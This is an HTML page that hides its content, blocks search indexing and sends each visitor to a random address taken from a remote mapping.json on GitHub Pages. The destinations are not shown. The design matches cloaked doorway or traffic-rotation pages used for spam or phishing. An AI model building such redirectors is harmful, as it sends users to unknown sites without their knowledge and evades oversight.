<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <title>Redirecting</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fff;
      overflow: hidden;
      display: none;
    }
  </style>
</head>
<body>
  <script>
    (async () => {
      const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";

      try {
        // 请求最新配置，不使用浏览器缓存。
        const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
        if (!res.ok) throw new Error("mapping.json not found");

        const data = await res.json();
        if (!data || !Array.isArray(data.links)) throw new Error("Invalid mapping structure");

        const activeLinks = data.links.filter(link => {
          if (!link || link.active !== true || typeof link.url !== "string") return false;
          try {
            const url = new URL(link.url);
            return url.protocol === "https:" || url.protocol === "http:";
          } catch {
            return false;
          }
        });
        if (!activeLinks.length) throw new Error("No active links");

        const idx = Math.floor(Math.random() * activeLinks.length);
        location.replace(activeLinks[idx].url);
        return;
      } catch (e) {
        console.error("Redirect failed:", e);
      }

      document.body.style.display = "block";
      document.body.innerHTML = '<h2 style="font-family: sans-serif; padding: 20px;">Please try again later.</h2>';
    })();
  </script>
</body>
</html>
